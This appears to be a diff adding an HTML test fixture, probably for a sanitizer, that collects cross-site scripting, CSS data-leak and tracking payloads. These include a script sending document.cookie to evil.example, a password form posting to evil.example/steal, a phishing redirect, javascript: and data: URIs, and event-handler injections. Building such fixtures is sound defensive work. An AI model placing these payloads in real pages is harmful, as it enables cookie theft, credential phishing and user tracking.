@@ -1,0 +1,51 @@
+<html>
+<head>
+<meta http-equiv="refresh" content="0; url=https://phish.example/login">
+<base href="https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/track.css">
+<script>document.location='https://evil.example/?c='+document.cookie</script>
+<style>
+@import url(https://evil.example/import.css);
+@import 'https://evil.example/import2.css';
+body { background: url(https://evil.example/bg.gif?u=victim); }
+input[value^="a"] { background-image: url("https://evil.example/leak?char=a"); }
+.x { background: u\72l(https://evil.example/escaped.gif); }
+.y { width: expression(alert(1)); behavior: url(https://evil.example/x.htc); -moz-binding: url(https://evil.example/xbl.xml#x); }
+.z { background-image: image-set("https://evil.example/set.png" 1x); }
+.q::after { content: "</style><script>alert(1)</script>"; }
+</style>
+</head>
+<body onload="alert('onload')">
+<p>Hello <b onmouseover="alert(1)">friend</b>, please verify your account.</p>
+<a href="javascript:alert(document.domain)">Click me</a>
+<a href=" JaVaScRiPt:alert(2)">Click me too</a>
+<a href="java&#x09;script:alert(3)">tabbed</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data link</a>
+<a href="vbscript:msgbox(1)">vb</a>
+<a href="https://www.google.com/url?q=javascript:alert(4)">wrapped js</a>
+<img src="x" onerror="alert('img')">
+<img src="javascript:alert(5)">
+<img src="https://evil.example/track.gif?id=victim" width="1" height="1">
+<img src="https://cdn.evil.example/banner.png" width="600" height="200" alt="Banner">
+<img src="data:text/html,<script>alert(6)</script>">
+<svg onload="alert(7)"><script>alert(8)</script><image href="https://evil.example/svg.png"/></svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(9)></style></mglyph></table></mtext></math>
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/obj.swf"></object>
+<embed src="https://evil.example/embed.swf">
+<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button type="submit">Login</button></form>
+<div style="background:url(https://evil.example/div-bg.gif);position:fixed;top:0;left:0;width:100%;height:100%">overlay</div>
+<div style="background-image: url(&quot;https://evil.example/quoted.gif&quot;)">quoted</div>
+<table background="https://evil.example/table-bg.gif"><tr><td background="javascript:alert(10)">cell</td></tr></table>
+<video poster="https://evil.example/poster.jpg" src="https://evil.example/v.mp4"></video>
+<audio src="https://evil.example/a.mp3"></audio>
+<a href="https://evil.example/ok" ping="https://evil.example/ping">ping link</a>
+<img srcset="https://evil.example/a.png 1x, https://evil.example/b.png 2x">
+<p style="color:red" onclick="alert(11)" ONCLICK="alert(12)">styled</p>
+<noscript><img src="https://evil.example/noscript.gif"></noscript>
+<template><img src="https://evil.example/template.gif"></template>
+<!-- <img src="https://evil.example/comment.gif"> -->
+<p>&lt;script&gt;alert(13)&lt;/script&gt; is shown as text</p>
+<plaintext><img src=https://evil.example/plaintext.gif>
+</body>
+</html>
